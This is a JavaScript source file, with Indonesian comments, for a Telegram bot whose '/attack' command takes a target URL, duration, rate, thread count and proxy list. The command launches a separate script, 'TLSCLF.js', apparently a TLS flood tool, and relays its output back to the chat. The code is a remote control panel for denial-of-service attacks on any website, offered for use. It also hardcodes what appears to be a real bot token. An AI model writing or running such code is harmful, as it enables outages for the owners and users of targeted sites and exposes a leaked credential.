const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');

// Ganti 'YOUR_BOT_TOKEN' dengan token bot Anda
const bot = new TelegramBot('7014973647:AAFPXvRrryrYO_-qm_LXfbtH3Tl-C9rYIJA', { polling: true });

// Fungsi untuk mendapatkan waktu dalam format tertentu
function getCurrentTime() {
  const now = new Date();
  const timeString = now.toLocaleTimeString();
  const dateString = now.toLocaleDateString();
  const dayString = now.toLocaleDateString('en-US', { weekday: 'long' });
  return `${timeString} ${dateString} ${dayString}`;
}

// Tanggapi pesan
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const message = "run attack:\n\n"
                + "/attack -URL--time--rate--thread--proxy-";
  bot.sendMessage(chatId, message);
});

// Tanggapi pesan
bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.chat.username;
  const time = getCurrentTime();
  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /attack`);

  const args = match[1].split(' '); // Memisahkan argumen
  const url = args[0];
  const timeArg = args[1];
  const rate = args[2];
  const thread = args[3];
  const proxyFile = args[4];
  // Jalankan child process untuk menjalankan HTTP.js
  const browserProcess = spawn('node', ['TLSCLF.js', url, timeArg, rate, thread, proxyFile], { cwd: __dirname });
    
  // Tangani output dari child process
  browserProcess.stdout.on('data', (data) => {
    console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
    bot.sendMessage(chatId, `stdout: ${data}`);
  });

  // Tangani selesainya child process
  browserProcess.on('close', (code) => {
    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
    bot.sendMessage(chatId, `attack selesai! ${code}`);
  });
});
